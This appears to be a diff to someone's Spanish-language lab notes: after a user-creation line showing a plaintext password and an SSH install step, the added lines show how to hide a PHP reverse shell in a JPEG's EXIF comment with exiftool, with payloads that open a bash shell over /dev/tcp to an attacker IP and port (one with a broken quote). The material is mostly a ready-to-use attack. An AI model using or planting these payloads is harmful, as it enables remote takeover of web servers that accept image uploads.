@@ -57,3 +57,11 @@ adduser gallineta: HuevoGallina
 instalamos ssh
 apt install openssh-server
 
+
+
+agregar la shell a un fichero imagen:
+exiftool -Comment='<?php // Reverse shell code ?>' image.jpg
+
+<?php // change these values as needed $ip = 'your_attacker_ip'; $port = 'your_port'; $sh = shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"); ?>
+<?php  $ip = '192.168.1.133'; $port = '443; $sh = shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"); ?>
+exiftool -Comment='<?php $ip = "192.168.1.133"; $port = "443"; $sh = shell_exec("/bin/bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\""); ?>' image.jpg
